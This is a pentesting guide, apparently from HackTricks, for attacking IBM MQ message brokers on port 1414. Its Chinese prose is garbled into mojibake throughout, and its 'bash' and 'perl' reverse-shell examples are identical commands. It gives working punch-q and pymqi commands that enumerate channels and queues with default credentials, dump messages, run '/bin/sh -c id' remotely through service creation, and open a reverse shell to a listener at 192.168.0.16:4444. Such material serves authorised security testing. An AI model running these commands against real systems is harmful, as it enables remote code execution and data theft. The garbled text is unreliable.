# 1414 - Pentesting IBM MQ

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

IBM MQ æ˜¯ä¸€ç§ IBM æŠ€æœ¯ï¼Œç”¨äºç®¡ç†æ¶ˆæ¯é˜Ÿåˆ—ã€‚ä¸å…¶ä»– **æ¶ˆæ¯ä¸­ä»‹** æŠ€æœ¯ä¸€æ ·ï¼Œå®ƒä¸“é—¨ç”¨äºæ¥æ”¶ã€å­˜å‚¨ã€å¤„ç†å’Œåˆ†ç±»ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…ä¹‹é—´çš„ä¿¡æ¯ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**å®ƒæš´éœ² IBM MQ TCP ç«¯å£ 1414**ã€‚
æœ‰æ—¶ï¼ŒHTTP REST API å¯èƒ½ä¼šæš´éœ²åœ¨ç«¯å£ **9443** ä¸Šã€‚
æŒ‡æ ‡ï¼ˆPrometheusï¼‰ä¹Ÿå¯ä»¥é€šè¿‡ TCP ç«¯å£ **9157** è®¿é—®ã€‚

IBM MQ TCP ç«¯å£ 1414 å¯ç”¨äºæ“ä½œæ¶ˆæ¯ã€é˜Ÿåˆ—ã€é€šé“â€¦â€¦ä½† **ä¹Ÿå¯ç”¨äºæ§åˆ¶å®ä¾‹**ã€‚

IBM æä¾›äº†å¤§é‡æŠ€æœ¯æ–‡æ¡£ï¼Œç½‘å€ä¸º [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq)ã€‚

## å·¥å…·

ä¸€ä¸ªå»ºè®®çš„æ˜“äºåˆ©ç”¨çš„å·¥å…·æ˜¯ **[punch-q](https://github.com/sensepost/punch-q)**ï¼Œä½¿ç”¨ Dockerã€‚è¯¥å·¥å…·ç§¯æä½¿ç”¨ Python åº“ `pymqi`ã€‚

å¯¹äºæ›´æ‰‹åŠ¨çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ Python åº“ **[pymqi](https://github.com/dsuch/pymqi)**ã€‚éœ€è¦ [IBM MQ ä¾èµ–é¡¹](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ã€‚

### å®‰è£… pymqi

**IBM MQ ä¾èµ–é¡¹** éœ€è¦å®‰è£…å’ŒåŠ è½½ï¼š

1. åœ¨ [https://login.ibm.com/](https://login.ibm.com/) åˆ›å»ºä¸€ä¸ªå¸æˆ·ï¼ˆIBMidï¼‰ã€‚
2. ä» [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) ä¸‹è½½ IBM MQ åº“ã€‚å¯¹äº Linux x86_64ï¼Œå®ƒæ˜¯ **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**ã€‚
3. è§£å‹ç¼©ï¼ˆ`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`ï¼‰ã€‚
4. è¿è¡Œ `sudo ./mqlicense.sh` æ¥å—è®¸å¯æ¡æ¬¾ã€‚

>å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Kali Linuxï¼Œè¯·ä¿®æ”¹æ–‡ä»¶ `mqlicense.sh`ï¼šåˆ é™¤/æ³¨é‡Šä»¥ä¸‹è¡Œï¼ˆåœ¨ç¬¬ 105-110 è¡Œä¹‹é—´ï¼‰ï¼š
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. å®‰è£…è¿™äº›è½¯ä»¶åŒ…ï¼š
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ç„¶åï¼Œä¸´æ—¶å°† `.so` æ–‡ä»¶æ·»åŠ åˆ° LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`ï¼Œ**åœ¨**ä½¿ç”¨è¿™äº›ä¾èµ–é¡¹è¿è¡Œå…¶ä»–å·¥å…·ä¹‹å‰ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥å…‹éš†é¡¹ç›® [**pymqi**](https://github.com/dsuch/pymqi)ï¼šå®ƒåŒ…å«æœ‰è¶£çš„ä»£ç ç‰‡æ®µã€å¸¸é‡ç­‰ã€‚æˆ–è€…æ‚¨å¯ä»¥ç›´æ¥å®‰è£…åº“ï¼š`pip install pymqi`ã€‚

### ä½¿ç”¨ punch-q

#### ä½¿ç”¨ Docker

åªéœ€ä½¿ç”¨ï¼š`sudo docker run --rm -ti leonjza/punch-q`ã€‚

#### ä¸ä½¿ç”¨ Docker

å…‹éš†é¡¹ç›® [**punch-q**](https://github.com/sensepost/punch-q)ï¼Œç„¶åæŒ‰ç…§è‡ªè¿°æ–‡ä»¶è¿›è¡Œå®‰è£…ï¼ˆ`pip install -r requirements.txt && python3 setup.py install`ï¼‰ã€‚

ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨ `punch-q` å‘½ä»¤ã€‚

## æšä¸¾

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ **punch-q** æˆ– **pymqi** æšä¸¾ **é˜Ÿåˆ—ç®¡ç†å™¨åç§°ã€ç”¨æˆ·ã€é€šé“å’Œé˜Ÿåˆ—**ã€‚

### é˜Ÿåˆ—ç®¡ç†å™¨

æœ‰æ—¶ï¼Œæ²¡æœ‰ä¿æŠ¤æªæ–½æ¥è·å–é˜Ÿåˆ—ç®¡ç†å™¨åç§°ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Channels

**punch-q** ä½¿ç”¨ä¸€ä¸ªå†…éƒ¨ï¼ˆå¯ä¿®æ”¹ï¼‰è¯æ±‡è¡¨æ¥æŸ¥æ‰¾ç°æœ‰çš„é€šé“ã€‚ç”¨æ³•ç¤ºä¾‹ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
ä¸€äº› IBM MQ å®ä¾‹æ¥å— **æœªè®¤è¯** çš„ MQ è¯·æ±‚ï¼Œå› æ­¤ä¸éœ€è¦ `--username / --password`ã€‚å½“ç„¶ï¼Œè®¿é—®æƒé™ä¹Ÿå¯èƒ½æœ‰æ‰€ä¸åŒã€‚

ä¸€æ—¦æˆ‘ä»¬è·å¾—ä¸€ä¸ªé€šé“åç§°ï¼ˆè¿™é‡Œæ˜¯ï¼š`DEV.ADMIN.SVRCONN`ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æšä¸¾æ‰€æœ‰å…¶ä»–é€šé“ã€‚

æšä¸¾åŸºæœ¬ä¸Šå¯ä»¥ä½¿ç”¨ **pymqi** ä¸­çš„è¿™ä¸ªä»£ç ç‰‡æ®µ `code/examples/dis_channels.py` æ¥å®Œæˆï¼š
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... ä½†æ˜¯ **punch-q** ä¹ŸåµŒå…¥äº†é‚£éƒ¨åˆ†ï¼ˆåŒ…å«æ›´å¤šä¿¡æ¯ï¼ï¼‰ã€‚
å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯åŠ¨ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Queues

æœ‰ä¸€ä¸ªä½¿ç”¨ **pymqi** çš„ä»£ç ç‰‡æ®µï¼ˆ`dis_queues.py`ï¼‰ï¼Œä½† **punch-q** å…è®¸æ£€ç´¢æœ‰å…³é˜Ÿåˆ—çš„æ›´å¤šä¿¡æ¯ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

æ‚¨å¯ä»¥é’ˆå¯¹é˜Ÿåˆ—/é€šé“è¿›è¡Œå—…æ¢/è½¬å‚¨æ¶ˆæ¯ï¼ˆéç ´åæ€§æ“ä½œï¼‰ã€‚ *ç¤ºä¾‹:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ä¸è¦çŠ¹è±«ï¼Œè¿­ä»£æ‰€æœ‰è¯†åˆ«çš„é˜Ÿåˆ—ã€‚**

### ä»£ç æ‰§è¡Œ

> åœ¨ç»§ç»­ä¹‹å‰çš„ä¸€äº›ç»†èŠ‚ï¼šIBM MQ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œæ§åˆ¶ï¼šMQSCã€PCFã€æ§åˆ¶å‘½ä»¤ã€‚å¯ä»¥åœ¨ [IBM MQ æ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison) ä¸­æ‰¾åˆ°ä¸€äº›ä¸€èˆ¬åˆ—è¡¨ã€‚
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***å¯ç¼–ç¨‹å‘½ä»¤æ ¼å¼***) æ˜¯æˆ‘ä»¬å…³æ³¨çš„ä¸å®ä¾‹è¿œç¨‹äº¤äº’çš„æ–¹å¼ã€‚**punch-q** å’Œè¿›ä¸€æ­¥çš„ **pymqi** åŸºäº PCF äº¤äº’ã€‚
>
> ä½ å¯ä»¥æ‰¾åˆ° PCF å‘½ä»¤çš„åˆ—è¡¨ï¼š
> * [æ¥è‡ª PCF æ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats)ï¼Œä»¥åŠ
> * [æ¥è‡ªå¸¸é‡](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes)ã€‚
>
> ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤æ˜¯ `MQCMD_CREATE_SERVICE`ï¼Œå…¶æ–‡æ¡£å¯åœ¨ [è¿™é‡Œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms) æ‰¾åˆ°ã€‚å®ƒçš„å‚æ•°æ˜¯æŒ‡å‘å®ä¾‹ä¸Šæœ¬åœ°ç¨‹åºçš„ `StartCommand`ï¼ˆç¤ºä¾‹ï¼š`/bin/sh`ï¼‰ã€‚
>
> æ–‡æ¡£ä¸­è¿˜æœ‰è¯¥å‘½ä»¤çš„è­¦å‘Šï¼šâ€œæ³¨æ„ï¼šæ­¤å‘½ä»¤å…è®¸ç”¨æˆ·ä»¥ mqm æƒé™è¿è¡Œä»»æ„å‘½ä»¤ã€‚å¦‚æœè¢«æˆäºˆä½¿ç”¨æ­¤å‘½ä»¤çš„æƒé™ï¼Œæ¶æ„æˆ–ç²—å¿ƒçš„ç”¨æˆ·å¯èƒ½ä¼šå®šä¹‰ä¸€ä¸ªæœåŠ¡ï¼Œä»è€ŒæŸå®³ä½ çš„ç³»ç»Ÿæˆ–æ•°æ®ï¼Œä¾‹å¦‚ï¼Œåˆ é™¤é‡è¦æ–‡ä»¶ã€‚â€
>
> *æ³¨æ„ï¼šå§‹ç»ˆæ ¹æ® IBM MQ æ–‡æ¡£ï¼ˆç®¡ç†å‚è€ƒï¼‰ï¼Œåœ¨ `/admin/action/qmgr/{qmgrName}/mqsc` å¤„è¿˜æœ‰ä¸€ä¸ª HTTP ç«¯ç‚¹ï¼Œå¯ä»¥è¿è¡Œç­‰æ•ˆçš„ MQSC å‘½ä»¤ä»¥åˆ›å»ºæœåŠ¡ï¼ˆ`DEFINE SERVICE`ï¼‰ã€‚è¿™ä¸€æ–¹é¢åœ¨è¿™é‡Œå°šæœªè¦†ç›–ã€‚*

ä½¿ç”¨ PCF è¿›è¡Œè¿œç¨‹ç¨‹åºæ‰§è¡Œçš„æœåŠ¡åˆ›å»º/åˆ é™¤å¯ä»¥é€šè¿‡ **punch-q** å®Œæˆï¼š

**ç¤ºä¾‹ 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> åœ¨ IBM MQ çš„æ—¥å¿—ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å‘½ä»¤å·²æˆåŠŸæ‰§è¡Œï¼š
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: The Command '808544aa7fc94c48' has started. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

æ‚¨è¿˜å¯ä»¥æšä¸¾æœºå™¨ä¸Šç°æœ‰çš„ç¨‹åºï¼ˆè¿™é‡Œ `/bin/doesnotexist` ... ä¸å­˜åœ¨ï¼‰ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**è¯·æ³¨æ„ï¼Œç¨‹åºå¯åŠ¨æ˜¯å¼‚æ­¥çš„ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦ç¬¬äºŒä¸ªé¡¹ç›®æ¥åˆ©ç”¨è¯¥æ¼æ´** ***(åå‘ shell çš„ç›‘å¬å™¨ã€åœ¨ä¸åŒæœåŠ¡ä¸Šåˆ›å»ºæ–‡ä»¶ã€é€šè¿‡ç½‘ç»œè¿›è¡Œæ•°æ®å¤–æ³„ ...)***

**ç¤ºä¾‹ 2**

ä¸ºäº†æ–¹ä¾¿åå‘ shellï¼Œ**punch-q** è¿˜æä¾›äº†ä¸¤ä¸ªåå‘ shell æœ‰æ•ˆè½½è·ï¼š

* ä¸€ä¸ªä½¿ç”¨ bash
* ä¸€ä¸ªä½¿ç”¨ perl

*å½“ç„¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ `execute` å‘½ä»¤æ„å»ºè‡ªå®šä¹‰çš„æœ‰æ•ˆè½½è·ã€‚*

å¯¹äº bash:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
å¯¹äºperlï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

æ‚¨å¯ä»¥æ·±å…¥ç ”ç©¶ IBM MQ æ–‡æ¡£ï¼Œå¹¶ç›´æ¥ä½¿ç”¨ **pymqi** python åº“æ¥æµ‹è¯• **punch-q** ä¸­æœªå®ç°çš„ç‰¹å®š PCF å‘½ä»¤ã€‚

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
å¦‚æœæ‚¨æ— æ³•æ‰¾åˆ°å¸¸é‡åç§°ï¼Œå¯ä»¥å‚è€ƒ[IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors)ã€‚

> *[`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster)çš„ç¤ºä¾‹ï¼ˆåè¿›åˆ¶ = 73ï¼‰ã€‚å®ƒéœ€è¦å‚æ•°`MQCA_CLUSTER_NAME`ï¼ˆåè¿›åˆ¶ = 2029ï¼‰ï¼Œå¯ä»¥æ˜¯`*`ï¼ˆæ–‡æ¡£ï¼šï¼‰ï¼š*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## æµ‹è¯•ç¯å¢ƒ

å¦‚æœæ‚¨æƒ³æµ‹è¯•IBM MQçš„è¡Œä¸ºå’Œæ¼æ´ï¼Œå¯ä»¥åŸºäºDockerè®¾ç½®æœ¬åœ°ç¯å¢ƒï¼š

1. åœ¨ibm.comå’Œcloud.ibm.comä¸Šæ‹¥æœ‰ä¸€ä¸ªè´¦æˆ·ã€‚
2. åˆ›å»ºä¸€ä¸ªå®¹å™¨åŒ–çš„IBM MQï¼š
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
é»˜è®¤æƒ…å†µä¸‹ï¼Œèº«ä»½éªŒè¯å·²å¯ç”¨ï¼Œç”¨æˆ·åä¸º `admin`ï¼Œå¯†ç ä¸º `passw0rd`ï¼ˆç¯å¢ƒå˜é‡ `MQ_ADMIN_PASSWORD`ï¼‰ã€‚åœ¨è¿™é‡Œï¼Œé˜Ÿåˆ—ç®¡ç†å™¨åç§°å·²è®¾ç½®ä¸º `MYQUEUEMGR`ï¼ˆå˜é‡ `MQ_QMGR_NAME`ï¼‰ã€‚

æ‚¨åº”è¯¥å·²ç»å¯åŠ¨å¹¶è¿è¡Œ IBM MQï¼Œå¹¶ä¸”å…¶ç«¯å£å·²æš´éœ²ï¼š
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ Docker é•œåƒçš„æ—§ç‰ˆæœ¬åœ¨ï¼š https://hub.docker.com/r/ibmcom/mq/.

## References

* [mgeeky's gist - "å®ç”¨çš„ IBM MQ æ¸—é€æµ‹è¯•ç¬”è®°"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ è·³è·ƒ - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQ æ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq)
